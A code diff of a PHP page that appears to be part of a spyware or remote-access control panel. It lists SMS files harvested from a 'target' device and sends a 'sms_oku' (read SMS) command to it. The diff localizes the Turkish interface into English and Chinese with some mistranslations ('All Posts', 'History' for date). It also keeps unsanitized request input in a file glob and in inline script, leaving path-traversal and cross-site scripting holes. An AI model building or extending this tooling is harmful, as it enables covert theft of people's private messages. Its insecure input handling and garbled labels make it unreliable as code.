@@ -2,7 +2,7 @@
 require_once 'module_controller.php';
 
 $uid_device = $_GET['target'];
-$contact_path = '../private/storage/sms-'.$uid_device.'*';
+$contact_path = './private/storage/sms-'.$uid_device.'*';
 $filelist = glob($contact_path);
 $contact_file_list = array();
 foreach ($filelist as $file){
@@ -20,7 +20,7 @@ foreach ($filelist as $file){
                 <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>
 
                 <div class="col-md-10 col-lg-offset-0">
-                        <label for="select" class="col-lg-2 control-label">Kayıtlı Dosyalar</label>
+                        <label for="select" class="col-lg-2 control-label">Saved Files</label>
                         <div class="col-lg-4">
                             <select class="form-control" id="selected-file" name="selected-file">
                                 <?php
@@ -31,23 +31,23 @@ foreach ($filelist as $file){
                             </select>
                         </div>
 
-                        <button type="button" id="btn-show-file" name="btn-show-file" class="btn btn-default">Dosyayı Göster</button>
+                        <button type="button" id="btn-show-file" name="btn-show-file" class="btn btn-default">Show File</button>
 
                 </div>
 
                 <div class="row"></div>
                 <br><br>
-                <legend>Tüm Mesajlar</legend>
+                <legend>All Posts</legend>
                 <div class="row">
                     <table class="table table-striped table-hover ">
                             <thead>
                             <tr>
                                 <th>#</th>
-                                <th>Türü</th>
+                                <th>Type</th>
                                 <th>Tel. No.</th>
                                 <th>SMS</th>
-                                <th>Okundu</th>
-                                <th>Tarih</th>
+                                <th>Read</th>
+                                <th>History</th>
                             </tr>
                             </thead>
                             <tbody id="body-content-id">
@@ -72,7 +72,7 @@ foreach ($filelist as $file){
         $.post( "commands.php", { sms_file_name: selected_file}, function( data, err ) {
             if (data){
                 Toastify({
-                    text: "Komut gönderildi.!",
+                    text: "命令已发送！",
                     backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                     className: "info",
                 }).showToast();
@@ -92,7 +92,7 @@ foreach ($filelist as $file){
 
             } else {
                 Toastify({
-                    text: "Komut başarısız.!",
+                    text: "命令发送失败！",
                     backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                     className: "info",
                 }).showToast();
@@ -106,13 +106,13 @@ foreach ($filelist as $file){
         $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", type: "sms_oku", value: true}, function( data, err ) {
             if (data.status){
                 Toastify({
-                    text: "Komut gönderildi.!",
+                    text: "命令已发送！",
                     backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                     className: "info",
                 }).showToast();
             } else {
                 Toastify({
-                    text: "Komut başarısız.!",
+                    text: "命令发送失败！",
                     backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                     className: "info",
                 }).showToast();
